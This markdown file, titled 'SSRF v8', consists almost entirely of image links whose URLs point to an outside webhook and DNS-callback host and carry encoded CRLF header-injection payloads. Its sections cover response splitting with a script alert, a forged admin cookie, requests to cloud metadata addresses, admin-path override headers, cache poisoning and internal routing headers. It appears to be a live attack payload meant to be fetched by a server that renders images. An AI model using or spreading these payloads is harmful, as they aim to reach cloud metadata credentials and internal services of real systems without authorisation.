# SSRF v8 - Advanced CRLF Header Injection

## HTTP Response Splitting

![r1](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/r1%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>.gif)

![r2](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/r2%0d%0aSet-Cookie:%20admin=true%0d%0a%0d%0a.gif)

## Absolute URI Injection

![a1](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/a1%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0aGET%20http://169.254.169.254/latest/meta-data/.gif)

![a2](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/a2%20HTTP/1.0%0d%0aHost:%20metadata.google.internal%0d%0a%0d%0aGET%20/.gif)

## Host Override Techniques

![o1](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/o1%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aConnection:%20close%0d%0a%0d%0a.gif)

![o2](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/o2%0d%0aX-Rewrite-URL:%20/admin%0d%0a.gif)

![o3](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/o3%0d%0aX-Original-URL:%20/admin%0d%0a.gif)

## Cache Poisoning Headers

![c1](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/c1%0d%0aX-Forwarded-Scheme:%20nothttps%0d%0a.gif)

![c2](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/c2%0d%0aX-Forwarded-Proto:%20https%0d%0aX-Forwarded-Port:%20443%0d%0a.gif)

## Internal Routing Headers

![i1](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/i1%0d%0aX-Backend-Server:%20internal.github.net%0d%0a.gif)

![i2](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/i2%0d%0aX-Custom-IP-Authorization:%2010.0.0.1%0d%0a.gif)

![i3](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/i3%0d%0aX-Real-IP:%20127.0.0.1%0d%0a.gif)

## HTTP/2 Pseudo-headers

![h2a](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/h2a%0d%0a:authority:%20169.254.169.254%0d%0a.gif)

![h2p](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/h2p%0d%0a:path:%20/latest/meta-data/%0d%0a.gif)

## Connection Manipulation

![conn1](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/conn1%0d%0aConnection:%20keep-alive%0d%0aKeep-Alive:%20timeout=9999%0d%0a.gif)

![conn2](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/conn2%0d%0aUpgrade:%20websocket%0d%0aConnection:%20Upgrade%0d%0a.gif)

## DNS Canaries for v8

![dns1](https://v8-response-split.136e610f-df46-485b-b57e-d42604727ca2.dnshook.site/dns1.gif)

![dns2](https://v8-header-inject.136e610f-df46-485b-b57e-d42604727ca2.dnshook.site/dns2.gif)

---

*v8: Advanced CRLF - Testing actual header injection impact*
